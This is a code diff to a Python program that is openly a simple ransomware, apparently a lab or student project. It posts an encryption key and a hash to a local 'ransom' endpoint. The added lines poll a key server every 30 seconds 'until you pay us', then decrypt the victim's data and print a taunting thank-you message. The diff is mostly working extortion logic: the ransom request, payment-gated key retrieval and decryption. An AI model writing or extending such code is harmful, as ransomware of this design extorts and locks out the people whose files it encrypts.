@@ -1,12 +1,17 @@
 import os
 import requests
 import shutil
+import time
 from hashlib import sha256
 from random import SystemRandom
 
-REQUEST_URL = 'http://localhost:5000/ransom?key={}&hash={}'
-ENCRYPT_PATH = 'encrypted_data'
 DECRYPT_PATH = 'decrypted_data'
+ENCRYPT_PATH = 'encrypted_data'
+REQUEST_URL = 'http://localhost:5000/ransom?key={}&hash={}'
+REQUEST_KEY_URL = 'http://localhost:5000/key?hash={}'
+DECRYPT_SUCCESS_MSG = ('YOU HAVE BEEN DECRYPTED. YOUR DATA CAN BE FOUND IN \b'
+                       '`DECRYPTED_DATA.ZIP`. THANK YOU FOR YOUR COOPERATION \b'
+                       ':)')
 
 
 def caesar_keygen():
@@ -112,4 +117,12 @@ if __name__ == '__main__':
         data = f.read()
     print(file_contents.format('0x' + str(sha_hash),
                                '0x' + bytes.hex(data)))
-    # print(r.text)
+    while True:
+        print('Requesting key... (this happens every 30s until you pay us)')
+        r = requests.get(REQUEST_KEY_URL.format(str(sha_hash)))
+        if (r.status_code != 200):
+            time.sleep(30)  # Request the key every 30 seconds
+        else:
+            decrypt(r.json()['key'], str(sha_hash))
+            print(DECRYPT_SUCCESS_MSG)
+            break
